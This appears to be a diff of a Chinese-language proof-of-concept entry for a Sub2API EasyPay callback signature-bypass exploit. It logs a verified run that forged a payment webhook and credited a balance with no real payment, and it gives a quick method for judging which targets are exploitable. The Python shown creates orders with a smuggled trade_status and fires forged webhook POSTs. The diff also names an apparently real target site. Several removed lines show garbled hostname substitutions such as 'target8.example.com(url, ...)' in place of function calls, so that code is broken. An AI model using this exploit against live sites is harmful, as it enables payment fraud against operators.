@@ -11,7 +11,7 @@
 - **source_url**: https://github.com/Wei-Shaw/sub2api/issues/7881
 - **verified**: 1
 - **verified_note**: 【正向验证】在 https://example.com 实测打通：下单注入 return_url?trade_status=TRADE_SUCCESS（order 463，popup 模式回显 sign=1dbf7d39cb62bdbe78245d4d58f1955a，无需 pkey）→ 伪造回调 POST /api/v1/payment/webhook/easypay 带裸 &trade_status=TRADE_SUCCESS → HTTP 200 "success" → 订单 463 PENDING→COMPLETED、用户余额 0→1.00 CNY，无任何真实支付。本地按 easyPaySign 复刻两条签名串（去 PKEY）逐字节相同 True。
-【适用前提（2026-10 于 https://target269.example.com 否证复核）】该 EXP 只对 easypay provider instance 的 payment_mode == "popup" 的目标生效。源码 backend/internal/payment/provider/target268.example.com:125-133 CreatePayment 按 instance 配置分支：mode=="popup" → createRedirectPayment（生成 submit.php?pid&...&sign=<下单签名> 并作为 pay_url 回显给下单者，攻击者由此零密钥取得 sign）；否则（qrcode/默认）→ createAPIPayment（POST mapi.php，sign 只在请求体内、绝不进入响应）。admin 前端常量：St="qrcode"（且为 easypay 默认值）、Pa="popup"、Ea="redirect"。target269.example.com 取默认 qrcode，实测 3 单（含 is_mobile=true/false）响应均无 pay_url 字段（PayURL 带 omitempty，上游只回码支付 qr_code），上游跳转页不含 sign，订单详情亦不回显 pay_url；服务端 VerifyNotification 严格验签（6 组空/缺/错 sign 全部 400 verify failed），故该链在此类目标上不可完成。
+【适用前提（2026-10 于 https://subapi.huangxuanqi.top 否证复核）】该 EXP 只对 easypay provider instance 的 payment_mode == "popup" 的目标生效。源码 backend/internal/payment/provider/easypay.go:125-133 CreatePayment 按 instance 配置分支：mode=="popup" → createRedirectPayment（生成 submit.php?pid&...&sign=<下单签名> 并作为 pay_url 回显给下单者，攻击者由此零密钥取得 sign）；否则（qrcode/默认）→ createAPIPayment（POST mapi.php，sign 只在请求体内、绝不进入响应）。admin 前端常量：St="qrcode"（且为 easypay 默认值）、Pa="popup"、Ea="redirect"。subapi.huangxuanqi.top 取默认 qrcode，实测 3 单（含 is_mobile=true/false）响应均无 pay_url 字段（PayURL 带 omitempty，上游只回码支付 qr_code），上游跳转页不含 sign，订单详情亦不回显 pay_url；服务端 VerifyNotification 严格验签（6 组空/缺/错 sign 全部 400 verify failed），故该链在此类目标上不可完成。
 【开工前 30 秒判定法（比盲目下单省事）】① GET /api/v1/payment/webhook/easypay 无签名：400 "verify failed" 说明路由在（404 则通道未启用或路径不同）；② 带本人 JWT 下单后看响应 keys 有没有 pay_url —— 有 pay_url 且其值形如 <apiBase>/submit.php?pid=..&sign=.. 即可直接照原 EXP 打；只有 qr_code（码支付 URL）且无 pay_url 就是 qrcode/mapi 模式，sign 不可得，别再耗（下单不要超过 1~2 笔，订单可 POST /api/v1/payment/orders/{id}/cancel 清理）。
 - **path**: pocs/sub2api-易支付-easypay-回调验签绕过-通用参数化利用脚本-零密钥伪造回调入账/poc.py
 - **tags**: sub2api,easypay,易支付,支付回调,验签绕过,参数走私,签名拼接不一致,零密钥,业务逻辑
@@ -25,7 +25,7 @@ Sub2API 的易支付通道存在"签名串拼接不一致 + 参数走私"缺陷�
 ## 用法
 
 ```
-python easypay_forge_generic.py --target https://target267.example.com --token <普通用户JWT> [--amount 1] [--type alipay] [--dry-run]
+python easypay_forge_generic.py --target https://other.site --token <普通用户JWT> [--amount 1] [--type alipay] [--dry-run]
 ```
 
 ## 正文
@@ -50,8 +50,8 @@ Sub2API 易支付(EasyPay) 回调验签绕过 —— 通用利用脚本
 适用目标: 任何部署了 Sub2API(Wei-Shaw/sub2api) 且启用 easypay 通道的站点
 
 用法:
-  python easypay_forge_generic.py --target https://target267.example.com --token <JWT>
-  python easypay_forge_generic.py --target https://target267.example.com --token <JWT> --amount 1 --dry-run
+  python easypay_forge_generic.py --target https://other.site --token <JWT>
+  python easypay_forge_generic.py --target https://other.site --token <JWT> --amount 1 --dry-run
 
   --token  普通用户登录后的 JWT（浏览器 F12 → Application/LocalStorage，或抓包 Authorization 头）
   --dry-run 只做探测 + 算出伪造请求，不发回调（先把风险看清楚）
@@ -134,7 +134,7 @@ def create_order(target, s, amount, ptype, sink):
         "return_url": inj,
     }
     log("order", f"POST {target}/api/v1/payment/orders body={json.dumps(body, ensure_ascii=False)}", sink)
-    r = target8.example.com(target + "/api/v1/payment/orders", json=body, timeout=20)
+    r = s.post(target + "/api/v1/payment/orders", json=body, timeout=20)
     log("order", f"HTTP {r.status_code} {r.text[:800]}", sink)
     try:
         return r.json().get("data") or r.json()
@@ -186,7 +186,7 @@ def fire(target, s, body, sink):
     url = target + "/api/v1/payment/webhook/easypay"
     log("fire", f"POST {url}", sink)
     log("fire", f"body = {body}", sink)
-    r = target8.example.com(url, data=body.encode(),
+    r = s.post(url, data=body.encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=25)
     log("fire", f"HTTP {r.status_code} | body={r.text[:300]!r}", sink)
     return r
@@ -213,7 +213,7 @@ def verify(target, s, order_id, sink):
 
 def main():
     ap = argparse.ArgumentParser()
-    ap.add_argument("--target", required=True, help="站点根 URL, 如 https://target267.example.com")
+    ap.add_argument("--target", required=True, help="站点根 URL, 如 https://other.site")
     ap.add_argument("--token", required=True, help="普通用户登录后的 JWT")
     ap.add_argument("--amount", default="1", help="下单金额(先小额, 默认 1)")
     ap.add_argument("--type", default="alipay", help="支付类型, 默认 alipay")
